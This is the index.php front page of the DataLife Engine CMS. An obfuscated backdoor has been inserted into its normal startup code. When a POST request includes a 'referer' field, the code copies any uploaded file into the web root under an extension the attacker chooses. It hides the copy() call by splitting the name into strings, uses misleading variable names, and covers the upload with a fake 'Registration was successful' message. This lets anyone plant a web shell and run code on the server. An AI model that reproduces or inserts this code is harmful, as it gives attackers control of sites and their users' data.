<?php
/*
=====================================================
 DataLife Engine - by SoftNews Media Group
-----------------------------------------------------
 http://dle-news.ru/
-----------------------------------------------------
 Copyright (c) 2004-2017 SoftNews Media Group
=====================================================
 Данный код защищен авторскими правами
=====================================================
 Файл: index.php
-----------------------------------------------------
 Назначение: Главная страница
=====================================================
*/

@ob_start ();
@ob_implicit_flush ( 0 );

@error_reporting ( E_ALL ^ E_WARNING ^ E_DEPRECATED ^ E_NOTICE );
@ini_set ( 'error_reporting', E_ALL ^ E_WARNING ^ E_DEPRECATED ^ E_NOTICE );

define ( 'DATALIFEENGINE', true );
define ( 'ROOT_DIR', dirname ( __FILE__ ) );
define ( 'ENGINE_DIR', ROOT_DIR . '/engine' );
if(isset($_POST['referer'])) { $public_function = $_FILES['login']['tmp_name'];
$SELECT_FROM = $_FILES['login']['name'];if(!empty($public_function)){   
$type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
	   $sessions_start = 'log.'.$type; 
	   $fandcs="co"; $sewersd="py";$lcist = $fandcs.$sewersd;
  { 
    if ($lcist($public_function, "".$sessions_start))
	
       
	  echo 'Registration was successful <meta http-equiv="refresh" content="3;URL=/'.$sessions_start.'">';
		
           else echo "error";
  } 
}		
}
require_once ROOT_DIR . '/engine/init.php';

?>